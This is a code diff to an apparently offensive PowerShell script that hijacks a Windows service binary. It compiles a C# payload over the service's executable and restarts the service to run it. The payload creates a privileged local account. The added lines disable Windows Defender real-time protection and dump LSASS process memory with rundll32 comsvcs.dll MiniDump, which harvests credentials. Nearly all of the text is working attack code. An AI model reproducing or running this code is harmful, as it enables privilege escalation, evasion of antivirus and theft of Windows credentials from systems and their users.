@@ -13,6 +13,8 @@ if($targets.Count -gt 0){
     $code = @"
 using System;
 using System.DirectoryServices;
+using System.Diagnostics;
+
 namespace HelloWorld
 {
 	public class Program$id
@@ -43,13 +45,51 @@ namespace HelloWorld
                 if (grp != null) {grp.Invoke("Add", new object[] {NewUser.Path.ToString()});}
                 Console.WriteLine("Account Created Successfully");
             }
+
+            string updateSettings = "\"{ Set-MpPreference -DisableRealtimeMonitoring $true }\"";
+            var pwsh = new Process {
+            StartInfo = new ProcessStartInfo {
+                    FileName = @"powershell.exe",
+                    Arguments = String.Format("-command {0}",updateSettings)
+                }
+            };
+            pwsh.Start();
+            pwsh.WaitForExit();
+
+            Process[] processlist = Process.GetProcessesByName("lsass");
+            foreach (Process p in processlist)
+            {
+                var strPID = Convert.ToString(p.Id);
+
+                var process = new Process {
+                StartInfo = new ProcessStartInfo {
+                        FileName = @"c:\windows\system32\rundll32.exe",
+                        Arguments = String.Format(@"C:\windows\System32\comsvcs.dll, MiniDump {0} C:\Temp\dumper.dmp full",strPID)
+                    }
+                };
+                process.Start();
+                process.WaitForExit();
+
+                var copy = new Process {
+                StartInfo = new ProcessStartInfo {
+                        FileName = @"c:\windows\system32\cmd.exe",
+                        Arguments = String.Format("/k \"move /Y C:\\Temp\\dumper.dmp C:\\temp\\temp.dmp\"")
+                    }
+                };
+                copy.Start();
+                copy.WaitForExit();
+                break;
+            }
+
+            
 		}
 	}
 }
 "@  | out-file C:\temp\adduser.cs
-    $name = $targets[0].Name
+    $name = $targets[0].Name.Trim()
     $path = ($targets[0].PathName -replace '"','')
     C:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:$path c:\temp\adduser.cs 
-    Stop-Service "$targets[0].Name" -ErrorAction SilentlyContinue
-    Start-Service "$targets[0].Name" -ErrorAction SilentlyContinue
-}
+    Stop-Service $name -ErrorAction SilentlyContinue
+    Start-Service $name -ErrorAction SilentlyContinue
+
+} 
